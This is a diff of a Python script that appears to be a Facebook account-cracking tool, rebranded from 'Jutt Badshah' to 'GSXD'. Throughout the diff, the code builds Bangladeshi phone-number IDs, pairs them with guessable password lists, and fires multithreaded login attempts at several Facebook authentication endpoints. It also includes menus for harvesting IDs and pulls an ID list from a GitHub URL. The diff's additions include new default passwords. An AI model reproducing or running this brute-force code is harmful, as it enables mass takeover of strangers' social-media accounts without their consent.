-                print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
-                time.sleep(0.5)
-                print (47*'-')
-                with JuttBadshah(max_workers=30) as (__juttbrand__):
-                    for juttxd in self.id:
+                os.system('clear')
+                print (logo4)
+                print (43*'-')
+                tl = str(len(user))
+                print('\033[92;1m>>\033[1;37m METHOD     :\033[1;32m M'+vz)
+                print (43*'-')
+                print ("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m┇ \033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m ┇ \033[1;97mAIRPLANE MODE")
+                print (43*'-')
+                with GSXDRiyad(max_workers=30) as (__GSXDbrand__):
+                    for GSXDxd in self.id:
                         try:
-                            juid = juttxd.split('|')[0]
+                            juid = GSXDxd.split('|')[0]
                             uid = k+c+juid
                             pwx = pwzzz.replace('number', c+juid).splitlines()
                             url1 = 'https://b-graph.facebook.com/auth/login'
                             url2 = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                             url3 = 'https://b-api.facebook.com/method/auth.login'
                             if vz == '1' and uz == '1':
-                                __juttbrand__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
+                                __GSXDbrand__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
                             elif vz == '1' and uz == '2':
-                                __juttbrand__.submit(self.__randoms__,uid,pwx,"x.facebook.com")
+                                __GSXDbrand__.submit(self.__randoms__,uid,pwx,"x.facebook.com")
                             elif vz == '1' and uz == '3':
-                                __juttbrand__.submit(self.__randoms__,uid,pwx,"free.facebook.com")
+                                __GSXDbrand__.submit(self.__randoms__,uid,pwx,"free.facebook.com")
                             elif vz == '2' and uz == '1':
-                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
+                                __GSXDbrand__.submit(self.__free__,uid,pwx,url1)
                             elif vz == '2' and uz == '2':
-                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
+                                __GSXDbrand__.submit(self.__free__,uid,pwx,url1)
                             elif vz == '2' and uz == '3':
-                                __juttbrand__.submit(self.__free__,uid,pwx,url3)
+                                __GSXDbrand__.submit(self.__free__,uid,pwx,url3)
                             elif vz == '3' and uz == '1':
-                                __juttbrand__.submit(self.__mmb__,uid,pwx,url1)
+                                __GSXDbrand__.submit(self.__mmb__,uid,pwx,url1)
                             elif vz == '3' and uz == '2':
-                                __juttbrand__.submit(self.__mmb__,uid,pwx,url2)
+                                __GSXDbrand__.submit(self.__mmb__,uid,pwx,url2)
                             elif vz == '3' and uz == '3':
-                                __juttbrand__.submit(self.__mmb__,uid,pwx,url3)
+                                __GSXDbrand__.submit(self.__mmb__,uid,pwx,url3)
                             else:
-                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
+                                __GSXDbrand__.submit(self.__free__,uid,pwx,url1)
                         except:
                             pass
 
@@ -1316,12 +1336,14 @@ class crack:
             os.system('clear')
             print (logo4)
             print ('\033[1;33mEnter Code 3 Digit bd Code\033[0;97m')
-            print (47*'-')
+            print (43*'-')
             print ('\033[1;33mExample 016, 017, 018, 019 ,etc.\033[0;97m')
-            print (47*'-')
+            print (43*'-')
             os.system('rm -rf .num.txt')
             k = '88'
             c = input('\033[1;36mEnter Code: \033[0;97m')
+            os.system('clear')
+            print (logo4)
             print ('\033[1;33mExample 1000,2000,3000,4000,5000,10000\033[0;97m')
             try:
                 cb = int(input('\033[1;33mNumbers Limit: \033[0;97m'))
@@ -1332,12 +1354,14 @@ class crack:
                 open('.num.txt', 'a').write(nmbr + '|' + '\n')
             self.id = open('.num.txt', 'r').read().splitlines()
             os.system('rm -rf .num.txt')
-            print (47*'-')
+            os.system('clear')
+            print (logo4)
+            print (43*'-')
             print ('\033[1;32m[1]Auto Password')
             print ('\033[1;32m[2]Choice Password\033[0;97m')
             pas=input('\033[0;97mSelect: ')
             if pas == '1':
-                pwz=['number', 'fullnumber', 'Bangladesh', 'bangladesh']
+                pwz=['number', 'fullnumber', 'Bangladesh', 'bangladesh', '708090', '203040', '@@@###']
                 pwzz = '\n'.join(pwz)
                 pwzzz = (pwzz + '\n')
             elif pas == '2':
@@ -1348,9 +1372,9 @@ class crack:
                     jdg = 1
                 y = 0
                 chsss = []
-                print (47*'-')
+                print (43*'-')
                 print ('\033[1;33mExample: number, fullnumber, Bangladesh, bangladesh\033[0;97m')
-                print (47*'-')
+                print (43*'-')
                 for y in range(jdg):
                     y += 1
                     pass1 = input('\033[1;32mPassword %s: \033[0;97m'%(y))
@@ -1358,20 +1382,23 @@ class crack:
                 helo = '\n'.join(chsss)
                 pwzzz = (helo + '\n')
                 chsss.clear()
-                print (47*'-')
+                print (43*'-')
             else:
                 pwz=['number', 'fullnumber', 'Bangladesh', 'bangladesh']
                 pwzz = '\n'.join(pwz)
                 pwzzz = (pwzz + '\n')
-            print ('\033[1;33m~~~~~~~~~~Method Menu~~~~~~~~~~\033[0;97m')
-            print (47*'-')
+            os.system('clear')
+            print (logo4)
+            print (43*'-')
+            print ('\033[1;33m~~~~~~~~~~~~~~~~Method Menu~~~~~~~~~~~~~~~~~\033[0;97m')
+            print (43*'-')
             print ('\033[1;32m[1] Method 1')
             print ('\033[1;32m[2] Method 2')
             print ('\033[1;32m[3] Method 3')
-            print (47*'-')
+            print (43*'-')
             vz = input('\033[1;36mSelect: \033[0;97m')
             if vz in ['1', '2', '3']:
-                print (47*'-')
+                print (43*'-')
                 print ('\033[1;32m[1] Crack (Fast)')
                 print ('\033[1;32m[2] Crack (Slow)')
                 print ('\033[1;32m[3] Crack (super slow)\033[0;97m')
@@ -1380,39 +1407,43 @@ class crack:
                 time.sleep(0.5)
                 print (' \x1b[1;97mCrack Running\x1b[1;97m ')
                 time.sleep(0.5)
-                print (47*'-')
-                print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
-                time.sleep(0.5)
-                print (47*'-')
-                with JuttBadshah(max_workers=30) as (__juttbrand__):
-                    for juttxd in self.id:
+                os.system('clear')
+                print (logo4)
+                print (43*'-')
+                tl = str(len(user))
+                print('\033[92;1m>>\033[1;37m METHOD     :\033[1;32m M'+vz)
+                print (43*'-')
+                print ("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m┇ \033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m ┇ \033[1;97mAIRPLANE MODE")
+                print (43*'-')
+                with GSXDRiyad(max_workers=30) as (__GSXDbrand__):
+                    for GSXDxd in self.id:
                         try:
-                            juid = juttxd.split('|')[0]
+                            juid = GSXDxd.split('|')[0]
                             uid = k+c+juid
                             pwx = pwzzz.replace('number', juid).replace('full', c).splitlines()
                             url1 = 'https://b-graph.facebook.com/auth/login'
                             url2 = 'https://b-graph.facebook.com/auth/login'
                             url3 = 'https://b-api.facebook.com/method/auth.login'
                             if vz == '1' and uz == '1':
-                                __juttbrand__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
+                                __GSXDbrand__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
                             elif vz == '1' and uz == '2':
-                                __juttbrand__.submit(self.__randoms__,uid,pwx,"x.facebook.com")
+                                __GSXDbrand__.submit(self.__randoms__,uid,pwx,"x.facebook.com")
                             elif vz == '1' and uz == '3':
-                                __juttbrand__.submit(self.__randoms__,uid,pwx,"free.facebook.com")
+                                __GSXDbrand__.submit(self.__randoms__,uid,pwx,"free.facebook.com")
                             elif vz == '2' and uz == '1':
-                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
+                                __GSXDbrand__.submit(self.__free__,uid,pwx,url1)
                             elif vz == '2' and uz == '2':
-                                __juttbrand__.submit(self.__free__,uid,pwx,url2)
+                                __GSXDbrand__.submit(self.__free__,uid,pwx,url2)
                             elif vz == '2' and uz == '3':
-                                __juttbrand__.submit(self.__free__,uid,pwx,url3)
+                                __GSXDbrand__.submit(self.__free__,uid,pwx,url3)
                             elif vz == '3' and uz == '1':
-                                __juttbrand__.submit(self.__mmb__,uid,pwx,url1)
+                                __GSXDbrand__.submit(self.__mmb__,uid,pwx,url1)
                             elif vz == '3' and uz == '2':
-                                __juttbrand__.submit(self.__mmb__,uid,pwx,url2)
+                                __GSXDbrand__.submit(self.__mmb__,uid,pwx,url2)
                             elif vz == '3' and uz == '3':
-                                __juttbrand__.submit(self.__mmb__,uid,pwx,url3)
+                                __GSXDbrand__.submit(self.__mmb__,uid,pwx,url3)
                             else:
-                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
+                                __GSXDbrand__.submit(self.__free__,uid,pwx,url1)
                         except:
                             pass
             hasil(ok,f2,cp)
@@ -1455,7 +1486,7 @@ def ext_menu():
     os.system('clear')
     print (logo4)
     print ('\033[1;33m  ~~~~~~Extract ids Menu~~~~~~\033[0;97m')
-    print (47*'-')
+    print (43*'-')
     print ('\033[1;32m[1]Extract ids Only New')
     print ('\033[1;32m[2]Extract All Old New Mix')
     print ('\033[1;32m[3]Extract ids Only New Auto')
@@ -1464,7 +1495,7 @@ def ext_menu():
     print ('\033[1;32m[6]Cut Links From Used File')
     print ('\033[1;32m[7]Delete Cookies')
     print ('\033[1;32m[0]Back\033[0;97m')
-    print (47*'-')
+    print (43*'-')
     ext_menu_sel()
 
 def ext_menu_sel():
@@ -1507,8 +1538,8 @@ def lolex():
 
     os.system('clear')
     print (logo4)
-    print ('\033[1;33mFor Example /sdcard/jutt.txt etc...\033[0;97m')
-    print (47*'-')
+    print ('\033[1;33mFor Example /sdcard/GSXD.txt etc...\033[0;97m')
+    print (43*'-')
     fp = input('\033[1;32mOutput Save File Name: \033[0;97m')
     if '/sdcard/' not in fp:
         print ('\033[1;33mGive Correct Directory /sdcard/filename.txt\033[0;97m')
@@ -1577,7 +1608,7 @@ def oldex():
     os.system('clear')
     print (logo4)
     print ('')
-    print ('\033[1;33mFor Example /sdcard/jutt.txt\033[0;97m')
+    print ('\033[1;33mFor Example /sdcard/GSXD.txt\033[0;97m')
     print ('')
     fp = input('\033[1;32mOutput Save File Name: \033[0;97m')
     if '/sdcard/' in fp:
@@ -1639,7 +1670,7 @@ def autofile():
         login()
     os.system('rm -rf .out*')
     try:
-        rgb = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/ids.txt').text
+        rgb = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/GSXDbrand/main/ids.txt').text
         open('.ids.txt', 'w').write(rgb)
     except requests.exceptions.ConnectionError:
         print ('\033[0;97mNo internet Connection')
@@ -1648,7 +1679,7 @@ def autofile():
     fgf = open('.ids.txt', 'r').read().splitlines()[2:4]
     os.system('rm -rf .ids.txt')
     print ('\033[1;33m  ~~~~~Put Just 1 id Link~~~~~\033[0;97m')
-    print (47*'-')
+    print (43*'-')
     bcd = input('\033[1;36mPut id: \033[0;97m')
     if bcd == '':
         ext_menu()
@@ -1698,8 +1729,8 @@ def autofile():
     os.system('rm -rf .out*')
     os.system('clear')
     print (logo4)
-    print ('\033[1;33mExample /sdcard/jutt.txt\033[0;97m')
-    print (47*'-')
+    print ('\033[1;33mExample /sdcard/GSXD.txt\033[0;97m')
+    print (43*'-')
     save_ = input('\033[1;33mOutput Save File Name: \033[0;97m')
     ihb = '5000'
     idx = []
@@ -1740,7 +1771,7 @@ def autofile():
     os.system('cat .out.txt > '+save_)
     yuy = open(save_, 'r').read().splitlines()
     fuf = str(len(yuy))
-    print (47*'-')
+    print (43*'-')
     print ('\033[1;33mSuccessfully Creat File\033[0;97m')
     print (47*'-'+'\n\033[1;32mTotal ids > '+fuf)
     print (47*'-'+'\n\033[1;36mYour File Save Path > '+save_)
@@ -1753,7 +1784,7 @@ def double():
     sf = input("\033[1;32mInput doubling File :\033[0;97m")
     if sf == ' ' or sf == '':
         main_menu()
-    print ('\033[1;33mFor Example /sdcard/jutt.txt')
+    print ('\033[1;33mFor Example /sdcard/GSXD.txt')
     tf = input("\033[1;32minput file path for save original: \033[0;97m")
     if '/sdcard/' in tf:
         os.system("sort -r "+ sf +" | uniq  >> "+tf)
@@ -1770,13 +1801,13 @@ def separate():
     os.system('clear')
     print (logo4)
     print ('\033[1;36mSeparate Links From File\033[0;97m')
-    print (47*'-')
+    print (43*'-')
     file_name = input('\033[1;32mInput file name: ')
     print(47*'-')
     if file_name == '':
         main_menu()
-    print ('\033[1;33mFor Example /sdcard/jutt.txt\033[0;97m')
-    print (47*'-')
+    print ('\033[1;33mFor Example /sdcard/GSXD.txt\033[0;97m')
+    print (43*'-')
     new_save = input('\033[1;36mSave New file Name: \033[0;97m')
     if "/sdcard/" not in new_save:
         print ('Put /sdcard/yourfile name.txt')
@@ -1804,7 +1835,7 @@ def cutrs():
     os.system('clear')
     print (logo4)
     print ('\033[1;33m~~~~~~Cut Links From Used File~~~~~~~\033[0;97m')
-    print (47*'-')
+    print (43*'-')
     bc = input('\033[1;32mPut File: \033[0;97m')
     try:
         ba = open(bc, 'r').read().splitlines()
@@ -1821,7 +1852,7 @@ def cutrs():
         bos = '\n'.join(dy)
         open(sab, 'w').write(bos + '\n')
         print ('\033[1;33mFile successfully Save > '+sab)
-        print (47*'-')
+        print (43*'-')
         input('\033[1;32mPress Enter To Back\033[0;97m')
         main_menu()
     except (ValueError, EOFError, KeyboardInterrupt):
@@ -1834,4 +1865,3 @@ def cutrs():
 if __name__ == '__main__':
     os.system('git pull')
 crack().plerr()
-
